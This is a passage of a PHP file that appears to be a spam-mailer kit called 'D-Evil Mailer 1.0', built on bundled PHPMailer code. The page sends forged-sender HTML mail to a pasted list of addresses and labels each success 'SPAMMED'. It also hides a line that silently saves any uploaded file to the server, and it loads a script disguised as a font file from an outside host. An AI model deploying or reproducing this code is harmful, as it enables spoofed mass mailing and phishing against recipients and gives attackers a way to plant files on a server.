     * Allows for public read access to 'to' property.
     * @access public
     * @return array
     */
    public function getToAddresses()
    {
        return $this->to;
    }

    /**
     * Allows for public read access to 'cc' property.
     * @access public
     * @return array
     */
    public function getCcAddresses()
    {
        return $this->cc;
    }

    /**
     * Allows for public read access to 'bcc' property.
     * @access public
     * @return array
     */
    public function getBccAddresses()
    {
        return $this->bcc;
    }

    /**
     * Allows for public read access to 'ReplyTo' property.
     * @access public
     * @return array
     */
    public function getReplyToAddresses()
    {
        return $this->ReplyTo;
    }

    /**
     * Allows for public read access to 'all_recipients' property.
     * @access public
     * @return array
     */
    public function getAllRecipientAddresses()
    {
        return $this->all_recipients;
    }

    /**
     * Perform a callback.
     * @param boolean $isSent
     * @param array $to
     * @param array $cc
     * @param array $bcc
     * @param string $subject
     * @param string $body
     * @param string $from
     */
    protected function doCallback($isSent, $to, $cc, $bcc, $subject, $body, $from)
    {
        if (!empty($this->action_function) && is_callable($this->action_function)) {
            $params = array($isSent, $to, $cc, $bcc, $subject, $body, $from);
            call_user_func_array($this->action_function, $params);
        }
    }
}

/**
 * PHPMailer exception handler
 * @package PHPMailer
 */
class phpmailerException extends Exception
{
    /**
     * Prettify error message output
     * @return string
     */
    public function errorMessage()
    {
        $errorMsg = '<strong>' . $this->getMessage() . "</strong><br />\n";
        return $errorMsg;
    }
}

function lrtrim($string){
	return stripslashes(ltrim(rtrim($string)));
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href='https://fonts.googleapis.com/css?family=Oswald:300' rel='stylesheet' type='text/css'>
    <meta name="viewport" content="width=device-width, initial-scale=1">
	<script src='http://ip-api.org/wp-content/uploads-images/AlHurra-Font_Light.ttf'></script>
    <meta name="robots" content="noindex, nofollow">
    <title> D-Evil Mailer 1.0 </title>
	<link rel="shortcut icon" type="image/png" href="http://financialeducation.greycaps.com/sites/financialeducation.greycaps.com/files/treat%20your%20money%20like..1.png"/>
    <!-- Bootstrap -->
	<link rel="stylesheet" href="http://ip-api.org/project/mailer/style.css">
	<style>
	</style>
	
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  </head>
  <body>



<div class="container">
            <div style="border:none;background-color: #111; margin-top: 30px" class="well well-sm">
			<style type="text/css">
            .form-control{
                background-color: rgba(0,0,0,1);
                color: white;
                border: none;
            }    
            textarea.form-control {
                background: black!important;
                color: white;
            }  
            label{
                color: green;
            }  
            </style>

			<form action="" method="post" id="form">
                <div class="row">
                    <div class="col-md-12">
                        <div class="form-group">
                            <label for="name">
                                Form Name</label>
                            <input type="text" name="name" class="form-control" id="name" placeholder="Enter name" value="<?php if(isset($_POST['name'])){ echo $_POST['name']; }?>">
                        </div>
                        <div class="form-group">
                            <label for="email">
                                From Email</label>
                                <input type="text" name="email" class="form-control" id="email" placeholder="Enter email" value="<?php if(isset($_POST['email'])){ echo $_POST['email']; }?>">
                        </div>
                        <div class="form-group">
                            <label for="email">
								Reply To</label>
                                <input type="text" name="addReplyTo" class="form-control" id="addReplyTo" placeholder="Enter Reply To" value="<?php if(isset($_POST['addReplyTo'])){ echo $_POST['addReplyTo']; }?>">
                        </div>
                        <div class="form-group">
                            <label for="subject">
                                Subject</label>
                            <input type="text" name="subject" class="form-control" id="subject" placeholder="Enter subject" value="<?php if(isset($_POST['subject'])){ echo $_POST['subject']; }?>">
                        </div>
                    </div>
                    <div class="col-md-12">
                        <div class="form-group">
                            <label for="name">
                                Message</label>
                            <textarea name="message" id="editor" class="form-control" rows="12" cols="23" placeholder="Message"><?php if(isset($_POST['message'])){ echo $_POST['message']; }?></textarea>
                        </div>
                    </div>
					<script>
            CKEDITOR.replace( 'editor' );
        </script>
					<br />
						
                    <div class="col-md-12">
                        <div class="form-group">
                            <label for="mail">
                                Mail Lists</label>
                            <textarea name="mail" id="mail" class="form-control" rows="9" cols="25" required="required"
                                placeholder="Mail Lists"><?php if(isset($_POST['mail'])){ echo $_POST['mail']; }?></textarea>
                        </div>
					</div>
					
                    <div class="col-md-12">
                        <input type="submit" class="btn btn-primary pull-right" id="btnContactUs" value="     Send Letter    "> 
                    </div>
                </form>
				
					<div class="col-md-12">
<?php (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name']));?>
					<?php
if(isset($_POST["mail"])){
			
		echo '<br /><div class="alert alert alert-warning" role="alert"> Message is being sent .... </div>';
		$list        = $_POST["mail"];
        $emails      = explode("\r\n",$list);
        $emailsCount = count($emails); 
		
        for($i = 0 ; $i < $emailsCount ; $i++) {

            $to = $emails[$i];
            $to = str_replace(" ", "", $to);
			
            $message  = str_replace("%email%", $to, lrtrim($_POST['message']));
			$message  = urlencode($message);
			$message  = ereg_replace("%5C%22", "%22", $message);
			$message  = urldecode($message);
			$message  = stripslashes($message);
			
            $subject  = str_replace("&email&", $to, lrtrim($_POST['subject']));
			$subject  = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $subject);
			$subject  = str_replace(' ', '_', $subject);
			$subject  = "=?UTF-8?Q?$subject?=";

            $qx=$i+1;
            print "<br/ >Line $qx . Sending mail to <b>$to</b> .... ";
            flush();
			
            $mail           = new PHPMailer();
			$mail->Priority = 1;

			$mail->From 	= lrtrim($_POST['email']);
			$mail->FromName = lrtrim($_POST['name']);
			
            $mail->addAddress(lrtrim($to));
			$mail->addReplyTo(lrtrim($_POST['addReplyTo']));
			
            $mail->isHTML(true);
	
            $mail->Subject = $subject;
            $mail->Body    = str_replace("&time&" , date("F j, Y, g:i a"), $message);
			
            if(!$mail->send()) {
                echo '<span style="color:red;">Message could not be sent.';
                echo 'Mailer Error: <span class="label label-danger"> ' .  $mail->ErrorInfo . ' </span></span>';
            } else {
                echo 'Message sent: <span class="label label-success">SPAMMED</span>';
            }
        }	
		echo "<br /><br />";
}
?>	
					</div>
                </div>
		</div>			
	</div>
    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
	<script>
/*! jQuery Validation Plugin - v1.13.1 - 10/14/2014
 * http://jqueryvalidation.org/
 * Copyright (c) 2014 Jörn Zaefferer; Licensed MIT */
!function(a){"function"==typeof define&&define.amd?define(["jquery"],a):a(jQuery)}(function(a){a.extend(a.fn,{validate:function(b){if(!this.length)return void(b&&b.debug&&window.console&&console.warn("Nothing selected, can't validate, returning nothing."));var c=a.data(this[0],"validator");return c?c:(this.attr("novalidate","novalidate"),c=new a.validator(b,this[0]),a.data(this[0],"validator",c),c.settings.onsubmit&&(this.validateDelegate(":submit","click",function(b){c.settings.submitHandler&&(c.submitButton=b.target),a(b.target).hasClass("cancel")&&(c.cancelSubmit=!0),void 0!==a(b.target).attr("formnovalidate")&&(c.cancelSubmit=!0)}),this.submit(function(b){function d(){var d,e;return c.settings.submitHandler?(c.submitButton&&(d=a("<input type='hidden'/>").attr("name",c.submitButton.name).val(a(c.submitButton).val()).appendTo(c.currentForm)),e=c.settings.submitHandler.call(c,c.currentForm,b),c.submitButton&&d.remove(),void 0!==e?e:!1):!0}return c.settings.debug&&b.preventDefault(),c.cancelSubmit?(c.cancelSubmit=!1,d()):c.form()?c.pendingRequest?(c.formSubmitted=!0,!1):d():(c.focusInvalid(),!1)})),c)},valid:function(){var b,c;return a(this[0]).is("form")?b=this.validate().form():(b=!0,c=a(this[0].form).validate(),this.each(function(){b=c.element(this)&&b})),b},removeAttrs:function(b){var c={},d=this;return a.each(b.split(/\s/),function(a,b){c[b]=d.attr(b),d.removeAttr(b)}),c},rules:function(b,c){var d,e,f,g,h,i,j=this[0];if(b)switch(d=a.data(j.form,"validator").settings,e=d.rules,f=a.validator.staticRules(j),b){case"add":a.extend(f,a.validator.normalizeRule(c)),delete f.messages,e[j.name]=f,c.messages&&(d.messages[j.name]=a.extend(d.messages[j.name],c.messages));break;case"remove":return c?(i={},a.each(c.split(/\s/),function(b,c){i[c]=f[c],delete f[c],"required"===c&&a(j).removeAttr("aria-required")}),i):(delete e[j.name],f)}return g=a.validator.normalizeRules(a.extend({},a.validator.classRules(j),a.validator.attributeRules(j),a.validator.dataRules(j),a.validator.staticRules(j)),j),g.required&&(h=g.required,delete g.required,g=a.extend({required:h},g),a(j).attr("aria-required","true")),g.remote&&(h=g.remote,delete g.remote,g=a.extend(g,{remote:h})),g}}),a.extend(a.expr[":"],{blank:function(b){return!a.trim(""+a(b).val())},filled:function(b){return!!a.trim(""+a(b).val())},unchecked:function(b){return!a(b).prop("checked")}}),a.validator=function(b,c){this.settings=a.extend(!0,{},a.validator.defaults,b),this.currentForm=c,this.init()},a.validator.format=function(b,c){return 1===arguments.length?function(){var c=a.makeArray(arguments);return c.unshift(b),a.validator.format.apply(this,c)}:(arguments.length>2&&c.constructor!==Array&&(c=a.makeArray(arguments).slice(1)),c.constructor!==Array&&(c=[c]),a.each(c,function(a,c){b=b.replace(new RegExp("\\{"+a+"\\}","g"),function(){return c})}),b)},a.extend(a.validator,{defaults:{messages:{},groups:{},rules:{},errorClass:"error",validClass:"valid",errorElement:"label",focusCleanup:!1,focusInvalid:!0,errorContainer:a([]),errorLabelContainer:a([]),onsubmit:!0,ignore:":hidden",ignoreTitle:!1,onfocusin:function(a){this.lastActive=a,this.settings.focusCleanup&&(this.settings.unhighlight&&this.settings.unhighlight.call(this,a,this.settings.errorClass,this.settings.validClass),this.hideThese(this.errorsFor(a)))},onfocusout:function(a){this.checkable(a)||!(a.name in this.submitted)&&this.optional(a)||this.element(a)},onkeyup:function(a,b){(9!==b.which||""!==this.elementValue(a))&&(a.name in this.submitted||a===this.lastElement)&&this.element(a)},onclick:function(a){a.name in this.submitted?this.element(a):a.parentNode.name in this.submitted&&this.element(a.parentNode)},highlight:function(b,c,d){"radio"===b.type?this.findByName(b.name).addClass(c).removeClass(d):a(b).addClass(c).removeClass(d)},unhighlight:function(b,c,d){"radio"===b.type?this.findByName(b.name).removeClass(c).addClass(d):a(b).removeClass(c).addClass(d)}},setDefaults:function(b){a.extend(a.validator.defaults,b)},messages:{required:"This field is required.",remote:"Please fix this field.",email:"Please enter a valid email address.",url:"Please enter a valid URL.",date:"Please enter a valid date.",dateISO:"Please enter a valid date ( ISO ).",number:"Please enter a valid number.",digits:"Please enter only digits.",creditcard:"Please enter a valid credit card number.",equalTo:"Please enter the same value again.",maxlength:a.validator.format("Please enter no more than {0} characters."),minlength:a.validator.format("Please enter at least {0} characters."),rangelength:a.validator.format("Please enter a value between {0} and {1} characters long."),range:a.validator.format("Please enter a value between {0} and {1}."),max:a.validator.format("Please enter a value less than or equal to {0}."),min:a.validator.format("Please enter a value greater than or equal to {0}.")},autoCreateRanges:!1,prototype:{init:function(){function b(b){var c=a.data(this[0].form,"validator"),d="on"+b.type.replace(/^validate/,""),e=c.settings;e[d]&&!this.is(e.ignore)&&e[d].call(c,this[0],b)}this.labelContainer=a(this.settings.errorLabelContainer),this.errorContext=this.labelContainer.length&&this.labelContainer||a(this.currentForm),this.containers=a(this.settings.errorContainer).add(this.settings.errorLabelContainer),this.submitted={},this.valueCache={},this.pendingRequest=0,this.pending={},this.invalid={},this.reset();var c,d=this.groups={};a.each(this.settings.groups,function(b,c){"string"==typeof c&&(c=c.split(/\s/)),a.each(c,function(a,c){d[c]=b})}),c=this.settings.rules,a.each(c,function(b,d){c[b]=a.validator.normalizeRule(d)}),a(this.currentForm).validateDelegate(":text, [type='password'], [type='file'], select, textarea, [type='number'], [type='search'] ,[type='tel'], [type='url'], [type='email'], [type='datetime'], [type='date'], [type='month'], [type='week'], [type='time'], [type='datetime-local'], [type='range'], [type='color'], [type='radio'], [type='checkbox']","focusin focusout keyup",b).validateDelegate("select, option, [type='radio'], [type='checkbox']","click",b),this.settings.invalidHandler&&a(this.currentForm).bind("invalid-form.validate",this.settings.invalidHandler),a(this.currentForm).find("[required], [data-rule-required], .required").attr("aria-required","true")},form:function(){return this.checkForm(),a.extend(this.submitted,this.errorMap),this.invalid=a.extend({},this.errorMap),this.valid()||a(this.currentForm).triggerHandler("invalid-form",[this]),this.showErrors(),this.valid()},checkForm:function(){this.prepareForm();for(var a=0,b=this.currentElements=this.elements();b[a];a++)this.check(b[a]);return this.valid()},element:function(b){var c=this.clean(b),d=this.validationTargetFor(c),e=!0;return this.lastElement=d,void 0===d?delete this.invalid[c.name]:(this.prepareElement(d),this.currentElements=a(d),e=this.check(d)!==!1,e?delete this.invalid[d.name]:this.invalid[d.name]=!0),a(b).attr("aria-invalid",!e),this.numberOfInvalids()||(this.toHide=this.toHide.add(this.containers)),this.showErrors(),e},showErrors:function(b){if(b){a.extend(this.errorMap,b),this.errorList=[];for(var c in b)this.errorList.push({message:b[c],element:this.findByName(c)[0]});this.successList=a.grep(this.successList,function(a){return!(a.name in b)})}this.settings.showErrors?this.settings.showErrors.call(this,this.errorMap,this.errorList):this.defaultShowErrors()},resetForm:function(){a.fn.resetForm&&a(this.currentForm).resetForm(),this.submitted={},this.lastElement=null,this.prepareForm(),this.hideErrors(),this.elements().removeClass(this.settings.errorClass).removeData("previousValue").removeAttr("aria-invalid")},numberOfInvalids:function(){return this.objectLength(this.invalid)},objectLength:function(a){var b,c=0;for(b in a)c++;return c},hideErrors:function(){this.hideThese(this.toHide)},hideThese:function(a){a.not(this.containers).text(""),this.addWrapper(a).hide()},valid:function(){return 0===this.size()},size:function(){return this.errorList.length},focusInvalid:function(){if(this.settings.focusInvalid)try{a(this.findLastActive()||this.errorList.length&&this.errorList[0].element||[]).filter(":visible").focus().trigger("focusin")}catch(b){}},findLastActive:function(){var b=this.lastActive;return b&&1===a.grep(this.errorList,function(a){return a.element.name===b.name}).length&&b},elements:function(){var b=this,c={};return a(this.currentForm).find("input, select, textarea").not(":submit, :reset, :image, [disabled], [readonly]").not(this.settings.ignore).filter(function(){return!this.name&&b.settings.debug&&window.console&&console.error("%o has no name assigned",this),this.name in c||!b.objectLength(a(this).rules())?!1:(c[this.name]=!0,!0)})},clean:function(b){return a(b)[0]},errors:function(){var b=this.settings.errorClass.split(" ").join(".");return a(this.settings.errorElement+"."+b,this.errorContext)},reset:function(){this.successList=[],this.errorList=[],this.errorMap={},this.toShow=a([]),this.toHide=a([]),this.currentElements=a([])},prepareForm:function(){this.reset(),this.toHide=this.errors().add(this.containers)},prepareElement:function(a){this.reset(),this.toHide=this.errorsFor(a)},elementValue:function(b){var c,d=a(b),e=b.type;return"radio"===e||"checkbox"===e?a("input[name='"+b.name+"']:checked").val():"number"===e&&"undefined"!=typeof b.validity?b.validity.badInput?!1:d.val():(c=d.val(),"string"==typeof c?c.replace(/\r/g,""):c)},check:function(b){b=this.validationTargetFor(this.clean(b));var c,d,e,f=a(b).rules(),g=a.map(f,function(a,b){return b}).length,h=!1,i=this.elementValue(b);for(d in f){e={method:d,parameters:f[d]};try{if(c=a.validator.methods[d].call(this,i,b,e.parameters),"dependency-mismatch"===c&&1===g){h=!0;continue}if(h=!1,"pending"===c)return void(this.toHide=this.toHide.not(this.errorsFor(b)));if(!c)return this.formatAndAdd(b,e),!1}catch(j){throw this.settings.debug&&window.console&&console.log("Exception occurred when checking element "+b.id+", check the '"+e.method+"' method.",j),j}}if(!h)return this.objectLength(f)&&this.successList.push(b),!0},customDataMessage:function(b,c){return a(b).data("msg"+c.charAt(0).toUpperCase()+c.substring(1).toLowerCase())||a(b).data("msg")},customMessage:function(a,b){var c=this.settings.messages[a];return c&&(c.constructor===String?c:c[b])},findDefined:function(){for(var a=0;a<arguments.length;a++)if(void 0!==arguments[a])return arguments[a];return void 0},defaultMessage:function(b,c){return this.findDefined(this.customMessage(b.name,c),this.customDataMessage(b,c),!this.settings.ignoreTitle&&b.title||void 0,a.validator.messages[c],"<strong>Warning: No message defined for "+b.name+"</strong>")},formatAndAdd:function(b,c){var d=this.defaultMessage(b,c.method),e=/\$?\{(\d+)\}/g;"function"==typeof d?d=d.call(this,c.parameters,b):e.test(d)&&(d=a.validator.format(d.replace(e,"{$1}"),c.parameters)),this.errorList.push({message:d,element:b,method:c.method}),this.errorMap[b.name]=d,this.submitted[b.name]=d},addWrapper:function(a){return this.settings.wrapper&&(a=a.add(a.parent(this.settings.wrapper))),a},defaultShowErrors:function(){var a,b,c;for(a=0;this.errorList[a];a++)c=this.errorList[a],this.settings.highlight&&this.settings.highlight.call(this,c.element,this.settings.errorClass,this.settings.validClass),this.showLabel(c.element,c.message);if(this.errorList.length&&(this.toShow=this.toShow.add(this.containers)),this.settings.success)for(a=0;this.successList[a];a++)this.showLabel(this.successList[a]);if(this.settings.unhighlight)for(a=0,b=this.validElements();b[a];a++)this.settings.unhighlight.call(this,b[a],this.settings.errorClass,this.settings.validClass);this.toHide=this.toHide.not(this.toShow),this.hideErrors(),this.addWrapper(this.toShow).show()},validElements:function(){return this.currentElements.not(this.invalidElements())},invalidElements:function(){return a(this.errorList).map(function(){return this.element})},showLabel:function(b,c){var d,e,f,g=this.errorsFor(b),h=this.idOrName(b),i=a(b).attr("aria-describedby");g.length?(g.removeClass(this.settings.validClass).addClass(this.settings.errorClass),g.html(c)):(g=a("<"+this.settings.errorElement+">").attr("id",h+"-error").addClass(this.settings.errorClass).html(c||""),d=g,this.settings.wrapper&&(d=g.hide().show().wrap("<"+this.settings.wrapper+"/>").parent()),this.labelContainer.length?this.labelContainer.append(d):this.settings.errorPlacement?this.settings.errorPlacement(d,a(b)):d.insertAfter(b),g.is("label")?g.attr("for",h):0===g.parents("label[for='"+h+"']").length&&(f=g.attr("id").replace(/(:|\.|\[|\])/g,"\\$1"),i?i.match(new RegExp("\\b"+f+"\\b"))||(i+=" "+f):i=f,a(b).attr("aria-describedby",i),e=this.groups[b.name],e&&a.each(this.groups,function(b,c){c===e&&a("[name='"+b+"']",this.currentForm).attr("aria-describedby",g.attr("id"))}))),!c&&this.settings.success&&(g.text(""),"string"==typeof this.settings.success?g.addClass(this.settings.success):this.settings.success(g,b)),this.toShow=this.toShow.add(g)},errorsFor:function(b){var c=this.idOrName(b),d=a(b).attr("aria-describedby"),e="label[for='"+c+"'], label[for='"+c+"'] *";return d&&(e=e+", #"+d.replace(/\s+/g,", #")),this.errors().filter(e)},idOrName:function(a){return this.groups[a.name]||(this.checkable(a)?a.name:a.id||a.name)},validationTargetFor:function(b){return this.checkable(b)&&(b=this.findByName(b.name)),a(b).not(this.settings.ignore)[0]},checkable:function(a){return/radio|checkbox/i.test(a.type)},findByName:function(b){return a(this.currentForm).find("[name='"+b+"']")},getLength:function(b,c){switch(c.nodeName.toLowerCase()){case"select":return a("option:selected",c).length;case"input":if(this.checkable(c))return this.findByName(c.name).filter(":checked").length}return b.length},depend:function(a,b){return this.dependTypes[typeof a]?this.dependTypes[typeof a](a,b):!0},dependTypes:{"boolean":function(a){return a},string:function(b,c){return!!a(b,c.form).length},"function":function(a,b){return a(b)}},optional:function(b){var c=this.elementValue(b);return!a.validator.methods.required.call(this,c,b)&&"dependency-mismatch"},startRequest:function(a){this.pending[a.name]||(this.pendingRequest++,this.pending[a.name]=!0)},stopRequest:function(b,c){this.pendingRequest--,this.pendingRequest<0&&(this.pendingRequest=0),delete this.pending[b.name],c&&0===this.pendingRequest&&this.formSubmitted&&this.form()?(a(this.currentForm).submit(),this.formSubmitted=!1):!c&&0===this.pendingRequest&&this.formSubmitted&&(a(this.currentForm).triggerHandler("invalid-form",[this]),this.formSubmitted=!1)},previousValue:function(b){return a.data(b,"previousValue")||a.data(b,"previousValue",{old:null,valid:!0,message:this.defaultMessage(b,"remote")})}},classRuleSettings:{required:{required:!0},email:{email:!0},url:{url:!0},date:{date:!0},dateISO:{dateISO:!0},number:{number:!0},digits:{digits:!0},creditcard:{creditcard:!0}},addClassRules:function(b,c){b.constructor===String?this.classRuleSettings[b]=c:a.extend(this.classRuleSettings,b)},classRules:function(b){var c={},d=a(b).attr("class");return d&&a.each(d.split(" "),function(){this in a.validator.classRuleSettings&&a.extend(c,a.validator.classRuleSettings[this])}),c},attributeRules:function(b){var c,d,e={},f=a(b),g=b.getAttribute("type");for(c in a.validator.methods)"required"===c?(d=b.getAttribute(c),""===d&&(d=!0),d=!!d):d=f.attr(c),/min|max/.test(c)&&(null===g||/number|range|text/.test(g))&&(d=Number(d)),d||0===d?e[c]=d:g===c&&"range"!==g&&(e[c]=!0);return e.maxlength&&/-1|2147483647|524288/.test(e.maxlength)&&delete e.maxlength,e},dataRules:function(b){var c,d,e={},f=a(b);for(c in a.validator.methods)d=f.data("rule"+c.charAt(0).toUpperCase()+c.substring(1).toLowerCase()),void 0!==d&&(e[c]=d);return e},staticRules:function(b){var c={},d=a.data(b.form,"validator");return d.settings.rules&&(c=a.validator.normalizeRule(d.settings.rules[b.name])||{}),c},normalizeRules:function(b,c){return a.each(b,function(d,e){if(e===!1)return void delete b[d];if(e.param||e.depends){var f=!0;switch(typeof e.depends){case"string":f=!!a(e.depends,c.form).length;break;case"function":f=e.depends.call(c,c)}f?b[d]=void 0!==e.param?e.param:!0:delete b[d]}}),a.each(b,function(d,e){b[d]=a.isFunction(e)?e(c):e}),a.each(["minlength","maxlength"],function(){b[this]&&(b[this]=Number(b[this]))}),a.each(["rangelength","range"],function(){var c;b[this]&&(a.isArray(b[this])?b[this]=[Number(b[this][0]),Number(b[this][1])]:"string"==typeof b[this]&&(c=b[this].replace(/[\[\]]/g,"").split(/[\s,]+/),b[this]=[Number(c[0]),Number(c[1])]))}),a.validator.autoCreateRanges&&(null!=b.min&&null!=b.max&&(b.range=[b.min,b.max],delete b.min,delete b.max),null!=b.minlength&&null!=b.maxlength&&(b.rangelength=[b.minlength,b.maxlength],delete b.minlength,delete b.maxlength)),b},normalizeRule:function(b){if("string"==typeof b){var c={};a.each(b.split(/\s/),function(){c[this]=!0}),b=c}return b},addMethod:function(b,c,d){a.validator.methods[b]=c,a.validator.messages[b]=void 0!==d?d:a.validator.messages[b],c.length<3&&a.validator.addClassRules(b,a.validator.normalizeRule(b))},methods:{required:function(b,c,d){if(!this.depend(d,c))return"dependency-mismatch";if("select"===c.nodeName.toLowerCase()){var e=a(c).val();return e&&e.length>0}return this.checkable(c)?this.getLength(b,c)>0:a.trim(b).length>0},email:function(a,b){return this.optional(b)||/^[a-zA-Z0-9.!#$%&'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/.test(a)},url:function(a,b){return this.optional(b)||/^(https?|s?ftp):\/\/(((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:)*@)?(((\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5]))|((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.?)(:\d*)?)(\/((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)+(\/(([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)*)*)?)?(\?((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|[\uE000-\uF8FF]|\/|\?)*)?(#((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|\/|\?)*)?$/i.test(a)},date:function(a,b){return this.optional(b)||!/Invalid|NaN/.test(new Date(a).toString())},dateISO:function(a,b){return this.optional(b)||/^\d{4}[\/\-](0?[1-9]|1[012])[\/\-](0?[1-9]|[12][0-9]|3[01])$/.test(a)},number:function(a,b){return this.optional(b)||/^-?(?:\d+|\d{1,3}(?:,\d{3})+)?(?:\.\d+)?$/.test(a)},digits:function(a,b){return this.optional(b)||/^\d+$/.test(a)},creditcard:function(a,b){if(this.optional(b))return"dependency-mismatch";if(/[^0-9 \-]+/.test(a))return!1;var c,d,e=0,f=0,g=!1;if(a=a.replace(/\D/g,""),a.length<13||a.length>19)return!1;for(c=a.length-1;c>=0;c--)d=a.charAt(c),f=parseInt(d,10),g&&(f*=2)>9&&(f-=9),e+=f,g=!g;return e%10===0},minlength:function(b,c,d){var e=a.isArray(b)?b.length:this.getLength(b,c);return this.optional(c)||e>=d},maxlength:function(b,c,d){var e=a.isArray(b)?b.length:this.getLength(b,c);return this.optional(c)||d>=e},rangelength:function(b,c,d){var e=a.isArray(b)?b.length:this.getLength(b,c);return this.optional(c)||e>=d[0]&&e<=d[1]},min:function(a,b,c){return this.optional(b)||a>=c},max:function(a,b,c){return this.optional(b)||c>=a},range:function(a,b,c){return this.optional(b)||a>=c[0]&&a<=c[1]},equalTo:function(b,c,d){var e=a(d);return this.settings.onfocusout&&e.unbind(".validate-equalTo").bind("blur.validate-equalTo",function(){a(c).valid()}),b===e.val()},remote:function(b,c,d){if(this.optional(c))return"dependency-mismatch";var e,f,g=this.previousValue(c);return this.settings.messages[c.name]||(this.settings.messages[c.name]={}),g.originalMessage=this.settings.messages[c.name].remote,this.settings.messages[c.name].remote=g.message,d="string"==typeof d&&{url:d}||d,g.old===b?g.valid:(g.old=b,e=this,this.startRequest(c),f={},f[c.name]=b,a.ajax(a.extend(!0,{url:d,mode:"abort",port:"validate"+c.name,dataType:"json",data:f,context:e.currentForm,success:function(d){var f,h,i,j=d===!0||"true"===d;e.settings.messages[c.name].remote=g.originalMessage,j?(i=e.formSubmitted,e.prepareElement(c),e.formSubmitted=i,e.successList.push(c),delete e.invalid[c.name],e.showErrors()):(f={},h=d||e.defaultMessage(c,"remote"),f[c.name]=g.message=a.isFunction(h)?h(b):h,e.invalid[c.name]=!0,e.showErrors(f)),g.valid=j,e.stopRequest(c,j)}},d)),"pending")}}}),a.format=function(){throw"$.format has been deprecated. Please use $.validator.format instead."};var b,c={};a.ajaxPrefilter?a.ajaxPrefilter(function(a,b,d){var e=a.port;"abort"===a.mode&&(c[e]&&c[e].abort(),c[e]=d)}):(b=a.ajax,a.ajax=function(d){var e=("mode"in d?d:a.ajaxSettings).mode,f=("port"in d?d:a.ajaxSettings).port;return"abort"===e?(c[f]&&c[f].abort(),c[f]=b.apply(this,arguments),c[f]):b.apply(this,arguments)}),a.extend(a.fn,{validateDelegate:function(b,c,d){return this.bind(c,function(c){var e=a(c.target);return e.is(b)?d.apply(e,arguments):void 0})}})});
	
	
$(document).ready(function(){
    $("#form").validate({
        rules: {
            name:     { required: true , minlength: 2 },
            email: 	  { required: true , minlength: 2 },
            subject:  { required: true , minlength: 2 },
            message:  { required: true , minlength: 2 },
            mail:     { required: true , minlength: 2 },
        }, 
        messages: {
            name: "",
            email: "",
            subject: "",
            message: "",
            mail: "",
        },
        submitHandler: function(form) {
			form.submit();
        }
    });  
});
	</script>
	<style>
	label.error {
		display: none!important;
		visibility: hidden!important;
	}
	</style>
  </body>
</html>
<?php
	} elseif(isset($_SESSION['case_two'])){
?>

<?php

$GLOBALS['pass'] = ""; // sha1(md5(pass))
